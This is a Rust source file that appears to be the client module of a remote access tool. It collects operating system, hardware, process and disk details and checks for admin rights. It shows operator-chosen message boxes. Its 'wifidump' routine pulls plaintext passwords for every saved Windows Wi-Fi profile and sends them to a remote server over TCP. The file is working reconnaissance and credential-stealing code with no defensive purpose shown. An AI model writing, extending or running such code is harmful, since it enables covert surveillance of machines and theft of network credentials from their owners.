use rfd::MessageDialog;
use shared::{
    BoxLevel, ClientMessage, DiskInformation, Display, HardwareInformation, MemoryInformation, OsInformation, Privilege, ProcessInformation, SystemInformation, WifiPasswords, utils::send_message
};
use std::net::TcpStream;

use sysinfo::{Disks, System};

// ---- sysInfo ---------------------------

fn get_system_information() -> SystemInformation {
    let mut sys = System::new();
    sys.refresh_all();

    let os_info = OsInformation {
        name: System::name(),
        hostname: System::host_name(),
        kernel_version: System::kernel_version(),
        os_version: System::os_version(),
    };

    let hwd_info = HardwareInformation {
        cpu_brand: sys
            .cpus()
            .first()
            .map(|cpu| cpu.brand().to_string())
            .unwrap_or_else(|| "unknown".to_string()),
        cpu_count: sys.cpus().len(),
    };

    let mem_info = MemoryInformation {
        total_ram: sys.total_memory(),
        used_ram: sys.used_memory(),
        total_swap: sys.total_swap(),
        used_swap: sys.used_swap(),
    };

    let processes: Vec<ProcessInformation> = sys
        .processes()
        .iter()
        .map(|(pid, process)| ProcessInformation {
            pid: pid.as_u32(),
            name: process.name().to_string_lossy().to_string(),
            cpu_usage: process.cpu_usage(),
            memory: process.memory(),
        })
        .collect();

    let disks_raw: Disks = Disks::new_with_refreshed_list();

    let disks: Vec<DiskInformation> = disks_raw
        .iter()
        .map(|disk| DiskInformation {
            name: disk.name().to_string_lossy().to_string(),
            file_system: disk.file_system().to_string_lossy().to_string(),
            total_space: disk.total_space(),
            available_space: disk.available_space(),
            is_removable: disk.is_removable(),
            is_read_only: disk.is_read_only(),
            device_path: disk.mount_point().to_string_lossy().to_string(),
        })
        .collect();

    SystemInformation {
        os: os_info,
        hardware: hwd_info,
        memory: mem_info,
        processes,
        disks,
    }
}

pub fn sysinfo(conn: &mut TcpStream) -> Result<bool, String> {
    let info: SystemInformation = get_system_information();

    let msg = ClientMessage::SystemInformation(info);
    match send_message(conn, &msg) {
        Ok(_) => Ok(true),
        Err(e) => return Err(e.to_string()), // ive should handle this better, the server can get stuck waiting for a msg
    }
}
// ---- sysInfo ---------------------------

// ---- checkPrivileges ---------------------------
#[cfg(unix)]
pub fn is_admin() -> bool {
    unsafe { libc::geteuid() == 0 }
}

#[cfg(windows)]
pub fn is_admin() -> bool {
    is_elevated::is_elevated()
}

pub fn check_privileges(conn: &mut TcpStream) -> Result<bool, String> {
    let msg = match is_admin() {
        true => Privilege::Admin,
        false => Privilege::User,
    };

    match send_message(conn, &msg) {
        Ok(_) => Ok(true),
        Err(e) => return Err(e.to_string()), // ive should handle this better, the server can get stuck waiting for a msg
    }
}

// ---- checkPrivileges ---------------------------

// ---- Display ---------------------------

pub fn display_message(content: Display) -> Result<bool, String> {
    let level = match content.level {
        BoxLevel::Info => rfd::MessageLevel::Info,
        BoxLevel::Warning => rfd::MessageLevel::Warning,
        BoxLevel::Error => rfd::MessageLevel::Error,
    };

    MessageDialog::new()
        .set_level(level)
        .set_title(content.title)
        .set_description(content.content)
        .show();

    Ok(true)
}

// ---- Display ---------------------------

// ---- WifiDump ---------------------------
#[cfg(windows)] //declare only in windows OS
fn parse_xml_and_get_key(xml_str: String, name: &str) -> Option<String> {
    use quick_xml::events::Event;
    use quick_xml::reader::Reader;

    let mut reader = Reader::from_str(&xml_str);
    reader.config_mut().trim_text(true);
    let mut buf = Vec::new();

    loop {
        match reader.read_event_into(&mut buf) {
            Ok(Event::Start(ref e)) if e.name().as_ref() == name.as_bytes() => {
                return reader.read_text(e.name()).ok().map(|cow| cow.to_string());
            }
            Ok(Event::Eof) => break,
            _ => {}
        }
        buf.clear();
    }

    None
}

#[cfg(windows)] //declare only in windows OS
pub fn extract_passwords(conn: &mut TcpStream) -> Result<Vec<WifiPasswords>, String> {
    use windows::Win32::NetworkManagement::WiFi::{WlanOpenHandle, WlanEnumInterfaces, WLAN_INTERFACE_INFO_LIST, WLAN_INTERFACE_INFO, WLAN_API_VERSION_2_0, WLAN_PROFILE_INFO_LIST, WlanGetProfileList, WlanGetProfile, WLAN_PROFILE_GET_PLAINTEXT_KEY, WlanFreeMemory, WlanCloseHandle};
    use windows::Win32::Foundation::{HANDLE, ERROR_SUCCESS};
    use windows::core::{PCWSTR, PWSTR};

    let mut wlan_handle: HANDLE = HANDLE::default();
    let mut negotiated_version = 0u32;
    let mut info_list_ptr: *mut WLAN_INTERFACE_INFO_LIST = std::ptr::null_mut();
    let mut profile_list_ptr: *mut WLAN_PROFILE_INFO_LIST = std::ptr::null_mut();

    unsafe { WlanOpenHandle(WLAN_API_VERSION_2_0, None, &mut negotiated_version, &mut wlan_handle); }

    unsafe {
        if WlanEnumInterfaces(wlan_handle, None, &mut info_list_ptr) != ERROR_SUCCESS.0 {
            let _ = send_message(conn, &ClientMessage::Error("Failed to enum wlan interfaces.".to_string()));
            return Err("WlanEnum failed".to_string());
        }
    }

    let info_list = unsafe { &*info_list_ptr };
    let mut passwords:Vec<WifiPasswords>  = Vec::new();

    for i in 0..info_list.dwNumberOfItems {
        let if_info: &WLAN_INTERFACE_INFO =
            &info_list.InterfaceInfo[i as usize];

        unsafe {
            if WlanGetProfileList(
                wlan_handle,
                &if_info.InterfaceGuid,
                None,
                &mut profile_list_ptr
            ) != ERROR_SUCCESS.0 {
                // send_message(conn, &ClientMessage::Error("Failed to get wlan profile.".to_string()));
                // return Err("WlanGetProfileList failed".to_string()); 
                continue;
            }
        }

        let profile_list = unsafe { &*profile_list_ptr };
        let profiles = unsafe {
            std::slice::from_raw_parts(
                profile_list.ProfileInfo.as_ptr(),
                profile_list.dwNumberOfItems as usize,
            )
        };

        for profile_info in profiles {

            let mut p_profile_xml: PWSTR = PWSTR::null();
            let mut flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            let mut access = 0u32;

            unsafe {
                if WlanGetProfile(
                    wlan_handle,
                    &if_info.InterfaceGuid,
                    PCWSTR(profile_info.strProfileName.as_ptr()),
                    None,
                    &mut p_profile_xml,
                    Some(&mut flags),
                    Some(&mut access),
                ) != ERROR_SUCCESS.0 { continue; }
            }

            let xml_string = unsafe {
                String::from_utf16_lossy(
                    std::slice::from_raw_parts(p_profile_xml.0, p_profile_xml.len())
                )
            };

            unsafe { WlanFreeMemory(p_profile_xml.0 as _) };

            let password = parse_xml_and_get_key(xml_string.clone(), "keyMaterial").unwrap_or("No password found".to_string());
            let chiper = parse_xml_and_get_key(xml_string, "authentication").unwrap_or("Unknown".to_string());
            let ssid = String::from_utf16_lossy(&profile_info.strProfileName);

            passwords.push(WifiPasswords { ssid, chiper, password });

        }

        unsafe { WlanFreeMemory(profile_list_ptr as _) };

        profile_list_ptr = std::ptr::null_mut();
    }

    unsafe {
        WlanFreeMemory(info_list_ptr as _);
        WlanCloseHandle(wlan_handle, None);
    };

    Ok(passwords)
}

pub fn wifidump(conn: &mut TcpStream) -> Result<bool, String> {
    #[cfg(not(target_os = "windows"))]
    {
        send_message(conn, &ClientMessage::Error("This can only be executed on Windows.".to_string()));
        return Ok(true)
    }

    let wifipasswd: Vec<WifiPasswords> = match extract_passwords(conn) { 
        Ok(w) => w,
        Err(e) => {
            let _ = send_message(conn, &ClientMessage::Error(e));
            return Ok(true)
        }
    };

    let msg = ClientMessage::WifiDump(wifipasswd);
    match send_message(conn, &msg) {
        Ok(_) => return Ok(true),
        Err(e) => return Err(e.to_string())
    }

}

// ---- WifiDump ---------------------------